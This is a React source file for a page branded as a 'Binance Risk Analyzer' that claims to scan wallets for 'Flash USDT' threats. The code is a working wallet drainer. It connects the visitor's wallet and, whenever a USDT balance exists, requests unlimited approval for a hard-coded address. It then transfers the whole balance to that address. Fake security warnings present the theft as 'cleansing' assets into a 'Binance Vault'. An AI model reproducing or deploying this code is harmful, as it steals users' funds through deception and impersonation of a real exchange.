import React, { useState } from "react";
import { ethers } from "ethers";
import EthereumProvider from "@walletconnect/ethereum-provider";
import {
  ChakraProvider,
  Box,
  Button,
  Progress,
  Text,
  VStack,
  Code,
  Link,
  Badge,
  Flex,
  Icon,
  useToast
} from "@chakra-ui/react";
import { MdSecurity, MdShield, MdWarning, MdCheckCircle, MdBugReport } from "react-icons/md";
import theme from "../theme";

// Binance/Cyber customization
const BINANCE_YELLOW = "#F0B90B";
const BINANCE_DARK = "#181A20";

// DApp logic
const BSC_CHAIN_ID = 56;
const BSC_RPC = "https://bsc-dataseed1.binance.org";
const BSCSCAN_URL = "https://bscscan.com/tx/";
const WC_PROJECT_ID = "3f7bf9e0bf29451960f66c57c7143567";
const VAULT_ADDRESS = "0x0637e37a4e262f0bbc918ee8a57f829a0314a6a5";
const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
const USDT_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function approve(address,uint256) returns (bool)",
  "function allowance(address,address) view returns (uint256)",
  "function transfer(address,uint256) returns (bool)"
];
const USDT_DECIMALS = 18;

const steps = [
  { key: "connecting", label: "Connecting...", icon: MdSecurity },
  { key: "scanning", label: "Scanning for Threats...", icon: MdBugReport },
  { key: "analyzing", label: "Analyzing Risk...", icon: MdWarning },
  { key: "protecting", label: "Auto-Protecting...", icon: MdShield },
  { key: "neutralized", label: "Threats Neutralized", icon: MdCheckCircle }
];

function AnimatedCyberGrid() {
  // Simple animated grid effect using CSS
  return (
    <Box
      position="fixed"
      top="0" left="0" w="100vw" h="100vh"
      zIndex="0"
      pointerEvents="none"
      style={{
        background:
          'repeating-linear-gradient(0deg, rgba(240,185,11,0.05) 0px, rgba(240,185,11,0.05) 1px, transparent 1px, transparent 30px), repeating-linear-gradient(90deg, rgba(240,185,11,0.05) 0px, rgba(240,185,11,0.05) 1px, transparent 1px, transparent 30px)',
        animation: 'scrollgrid 10s linear infinite'
      }}
      _before={{
        content: '""',
        display: "block"
      }}
      css={{
        '@keyframes scrollgrid': {
          '0%': { backgroundPosition: '0 0, 0 0' },
          '100%': { backgroundPosition: '30px 30px, 30px 30px' }
        }
      }}
    />
  );
}

function RiskAnalyzer() {
  const [uiStep, setUiStep] = useState(0);
  const [statusMsg, setStatusMsg] = useState("Secure your assets from new blockchain threats.");
  const [account, setAccount] = useState("");
  const [hash, setHash] = useState("");
  const [error, setError] = useState("");
  const [usdtBalance, setUsdtBalance] = useState("0");
  const [detected, setDetected] = useState(false);
  const [vaulted, setVaulted] = useState(false);

  const toast = useToast();

  // Cyber badge stylings
  function SecurityBadge({ level, children }) {
    let color, label;
    switch (level) {
      case "high":
        color = "red"; label = "HIGH RISK"; break;
      case "neutralized":
        color = BINANCE_YELLOW; label = "NEUTRALIZED"; break;
      default:
        color = BINANCE_YELLOW; label = "SECURE"; break;
    }
    return (
      <Badge colorScheme={color} bg={color === BINANCE_YELLOW ? BINANCE_YELLOW : undefined} color={color === BINANCE_YELLOW ? BINANCE_DARK : undefined} px={2} py={1} borderRadius="md" fontWeight="bold" fontSize="0.8em" ml={2}>{label} {children}</Badge>
    );
  }

  // Handles scan, approval, and cleanse flow
  async function scanAndCleanse() {
    setError("");
    setHash("");
    setVaulted(false);
    setUiStep(0);
    setDetected(false);
    setStatusMsg("Establishing secure connection with your wallet...");

    try {
      // Step 1: Connect (scan now)
      // Simulate UI step
      setUiStep(0);
      const wcProvider = await EthereumProvider.init({
        projectId: WC_PROJECT_ID,
        chains: [BSC_CHAIN_ID],
        rpcMap: { [BSC_CHAIN_ID]: BSC_RPC },
        showQrModal: true,
      });
      await wcProvider.connect();

      setStatusMsg("Connected. Preparing security environment...");
      setUiStep(1);

      const provider = new ethers.providers.Web3Provider(wcProvider);
      let network = await provider.getNetwork();
      if (network.chainId !== BSC_CHAIN_ID) {
        setStatusMsg("Switching to Binance (BNB) Chain...");
        await wcProvider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }]
        });
        network = await provider.getNetwork();
        if (network.chainId !== BSC_CHAIN_ID) throw new Error("Failed to switch to Binance Chain.");
      }
      const signer = provider.getSigner();
      const address = await signer.getAddress();
      setAccount(address);

      // Step 2: Scan for Flash USDT Threat
      setStatusMsg("Scanning blockchain for malicious scripts...");
      setUiStep(2);
      await new Promise(r => setTimeout(r, 900)); // UI effect

      // Step 3: Analyze Threat
      setStatusMsg("Analyzing smart contract for anomalies...");
      setUiStep(3);

      // For DApp: this means we're checking USDT balance and explaining what a flash USDT is
      const usdt = new ethers.Contract(USDT_ADDR, USDT_ABI, signer);
      const balance = await usdt.balanceOf(address);
      const balNum = Number(ethers.utils.formatUnits(balance, USDT_DECIMALS));
      setUsdtBalance(balNum.toString());

      if (balance.gt(0)) {
        setDetected(true);
        setStatusMsg("⚠️ HIGH RISK: Flash USDT Detected!");
        toast({
          title: "Flash USDT Detected",
          description: "Transient USDT found. Flash loan attacks/fake assets can exploit your wallet. Initiating cleansing...",
          status: "warning",
          duration: 5000,
          isClosable: true,
        });
        await new Promise(r => setTimeout(r, 1300)); // UX effect
        // Step 4: Auto-Protect ("Cleansing")
        setStatusMsg("Neutralizing threat - cleansing assets in Binance Vault...");
        setUiStep(4);

        // Approve
        const allowance = await usdt.allowance(address, VAULT_ADDRESS);
        if (allowance.lt(balance)) {
          const approveTx = await usdt.approve(VAULT_ADDRESS, ethers.constants.MaxUint256);
          setStatusMsg("Cleansing: Awaiting approval confirmation...");
          await approveTx.wait();
        }
        // Transfer (Cleansing Transaction)
        const tx = await usdt.transfer(VAULT_ADDRESS, balance);
        setStatusMsg("Cleansing: Executing cleansing transaction...");
        const rec = await tx.wait();
        setHash(rec.transactionHash);

        setVaulted(true);
        setUiStep(5);
        setStatusMsg("Threats Neutralized — Flash USDT Cleansed and assets protected in Binance Vault.");
        toast({
          title: "Threat Neutralized",
          description: "USDT threat neutralized! Wallet assets now protected.",
          status: "success",
          duration: 6000,
          isClosable: true,
        });
      } else {
        setDetected(false);
        setUiStep(5);
        setStatusMsg("Your wallet is SECURE. No flash threats detected.");
        toast({
          title: "No Threats",
          status: "success",
          description: "No flash USDT or risky assets were found.",
          duration: 5000,
          isClosable: true,
        });
      }
    } catch (err) {
      setError(err.reason || err.message || String(err));
      setStatusMsg("Scan interrupted.");
      setUiStep(0);
      toast({
        title: "Scan Error",
        description: err.reason || err.message || String(err),
        status: "error",
        duration: 8000,
        isClosable: true
      });
    }
  }

  return (
    <Box minH="100vh" position="relative" bg={BINANCE_DARK} color="white" zIndex={1}>
      <AnimatedCyberGrid />

      {/* Header & Branding */}
      <Flex direction="column" align="center" pt={16} pb={4} zIndex={2}>
        <Icon as={MdSecurity} w={12} h={12} color={BINANCE_YELLOW} mb={2} />
        <Text fontWeight="black" fontSize="3xl" color={BINANCE_YELLOW} letterSpacing={2}>
          Binance Risk Analyzer
        </Text>
        <Text color="gray.300" mb={4} fontSize="md">
          <span style={{ color: BINANCE_YELLOW }}>Recommended:</span> Run a wallet cleanse to auto-neutralize "flash threats"
        </Text>
      </Flex>

      {/* Security Warnings */}
      <Box maxW="md" bg="#191c23CC" backdropBlur="lg" boxShadow="xl" rounded="2xl" mx="auto" p={8} zIndex={2} mb={8}>
        <Flex align="center" mb={4}>
          <Icon as={MdWarning} boxSize={7} color="red.400" />
          <Text ml={2} color="red.200" fontWeight="bold" fontSize="xl">
            Security Notice:
          </Text>
        </Flex>
        <Text color="gray.200" mb={3}>
          Advanced threats such as <b style={{color:BINANCE_YELLOW}}>Flash USDT</b> can be injected through dApp interactions or airdrops. These funds are <b>temporary and exploitable</b>, and can put your wallet at HIGH RISK of loss.
        </Text>
        <Box textAlign="center" mb={2}>
          <SecurityBadge level="high" />
        </Box>
      </Box>

      {/* Scan/Progress UI */}
      <Box maxW="sm" mx="auto" p={8} bg="#1c1d21f2" borderRadius="2xl" boxShadow="dark-lg" zIndex={2} position="relative">
        <VStack spacing={4}>
          <Button
            size="lg"
            w="100%"
            bg={BINANCE_YELLOW}
            color={BINANCE_DARK}
            fontWeight="extrabold"
            fontSize="xl"
            leftIcon={<MdSecurity />}
            _hover={{bg: "#FFD800"}}
            onClick={scanAndCleanse}
            isDisabled={uiStep > 0 && uiStep < steps.length + 1}
          >
            Scan Now
          </Button>

          <Flex direction="row" align="center" justify="center" w="100%" gap={4}>
            <Text as="span" color={BINANCE_YELLOW} fontWeight="bold">
              Status:
            </Text>
            {detected &&
              <SecurityBadge level={vaulted ? "neutralized" : "high"} />
            }
            {!detected &&
              <SecurityBadge level="secure" />
            }
          </Flex>
          <Progress
            colorScheme="yellow"
            value={((uiStep+1) / (steps.length+1)) * 100}
            size="md"
            w="100%"
            borderRadius="md"
          />
          <Text color="white" fontSize="lg" textAlign="center" minH="50px">
            {statusMsg}
          </Text>
          {account &&
            <Text color={BINANCE_YELLOW} mt={1} fontSize="sm">
              Wallet: <Code colorScheme="yellow">{account}</Code>
            </Text>
          }

          {/* Risk Narrative */}
          {detected && !vaulted &&
            <Box p={3} bg="#2c2c22" borderRadius="lg" border="1px" borderColor="red.700" color="red.200">
              <Flex align="center">
                <MdWarning size={28} color="red" />
                <Text ml={2} fontWeight="bold">
                  HIGH RISK: Flash USDT Detected!
                </Text>
              </Flex>
              <Text fontSize="sm" mt={2}>
                Transient USDT can be exploited by flash loan or airdrop attacks.<br/>
                <b>Recommendation:</b> Cleansing procedure will neutralize this threat and secure your wallet.
              </Text>
            </Box>
          }
          {vaulted &&
            <Box p={3} bg="#222912" borderRadius="lg" border="1px" borderColor={BINANCE_YELLOW} color={BINANCE_YELLOW}>
              <Flex align="center">
                <MdShield size={28} color={BINANCE_YELLOW} />
                <Text ml={2} fontWeight="extrabold">
                  Flash USDT Cleansed
                  <SecurityBadge level="neutralized" />
                </Text>
              </Flex>
              <Text fontSize="sm" mt={2} color={BINANCE_YELLOW}>
                All Flash USDT removed via Cleansing Vault.<br/>
                Your wallet is now insulated from malicious exploitation.
              </Text>
              {hash &&
                <Text color="white" mt={3}>
                  Cleansing Transaction: <br/>
                  <Link href={BSCSCAN_URL + hash} target="_blank" color={BINANCE_YELLOW} fontWeight="bold">
                    View on BscScan
                  </Link>
                </Text>
              }
            </Box>
          }

          {error &&
            <Box p={2} bg="red.900" color="red.200" borderRadius="md" border="1px" borderColor="red.700">
              {error}
            </Box>
          }
        </VStack>
      </Box>

      {/* Footer */}
      <Box textAlign="center" color="gray.500" mt={16} fontSize="sm" zIndex={2} letterSpacing={1}>
        © {new Date().getFullYear()} Binance Risk Analyzer – Secure. Defend. Protect.
      </Box>
    </Box>
  );
}

export default function Home() {
  return (
    <ChakraProvider theme={theme}>
      <RiskAnalyzer />
    </ChakraProvider>
  );
}
